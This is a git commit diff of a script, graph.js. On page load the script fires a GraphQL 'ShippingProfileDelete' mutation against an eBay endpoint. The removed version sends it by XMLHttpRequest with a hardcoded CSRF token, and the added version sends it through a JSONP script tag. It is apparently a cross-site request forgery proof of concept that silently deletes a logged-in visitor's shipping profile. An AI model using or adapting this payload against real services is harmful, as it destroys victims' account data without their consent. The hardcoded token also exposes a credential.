18b3dca2ae5c3a3ba8a86e6cc6035c8bb682eeb3
naysser <77415898+naysser@users.noreply.github.com>
2023-07-19 22:31:51 +0100

    Update graph.js

--- graph.js
+++ graph.js
@@ -1,23 +1,27 @@
-// Define the GraphQL query data as a string
-var graphQLData = `{"operationName":"ShippingProfileDelete","variables":{"input":{"id":"1993776"}},"query":"mutation ShippingProfileDelete($input: deleteProfileInput!) {\n  deleteProfile(input: $input) {\n    success\n    errors {\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}`;
+function executeGraphQLWithJSONP() {
+   var graphQLData = `{"operationName":"ShippingProfileDelete","variables":{"input":{"id":"1993776"}},"query":"mutation ShippingProfileDelete($input: deleteProfileInput!) {\n  deleteProfile(input: $input) {\n    success\n    errors {\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}`;
 
-// Define the GraphQL endpoint URL
-var endpointURL = "https://cbtemagweb.ebay.com/graphql";
+   // Replace this URL with the GraphQL server URL that supports JSONP
+   var endpointURL = "https://cbtemagweb.ebay.com/graphql";
 
-// Function to execute the GraphQL POST request
-function executeGraphQL() {
-   var xhr = new XMLHttpRequest();
-   xhr.open("POST", endpointURL, true);
-   xhr.setRequestHeader("Content-Type", "application/json");
-   xhr.setRequestHeader("X-Csrf-Token", "hM8uzgrl2eOHo8pZSQ0ePBNAjnsNwr86y1tYjI73b+q+aAHiBBktQDaNXeOz9xgHoNPEo3ZhkiItLkpdVmC8Jw==");
-   xhr.onreadystatechange = function () {
-      if (xhr.readyState === XMLHttpRequest.DONE) {
-         // Process the response here (if needed)
-         console.log(xhr.responseText);
-      }
+   // Generate a unique callback function name
+   var callbackName = "jsonp_" + Date.now();
+
+   // Create the script tag with the JSONP request URL
+   var script = document.createElement("script");
+   script.src = endpointURL + "?callback=" + callbackName + "&data=" + encodeURIComponent(graphQLData);
+   document.head.appendChild(script);
+
+   // Create the global callback function
+   window[callbackName] = function (data) {
+      // Process the JSONP response here (data should contain the GraphQL response)
+      console.log(data);
+
+      // Remove the script tag and the global callback function
+      document.head.removeChild(script);
+      delete window[callbackName];
    };
-   xhr.send(graphQLData);
 }
 
-// Execute the GraphQL request when the script is loaded
-executeGraphQL();
+// Call the function when the page is loaded
+window.onload = executeGraphQLWithJSONP;
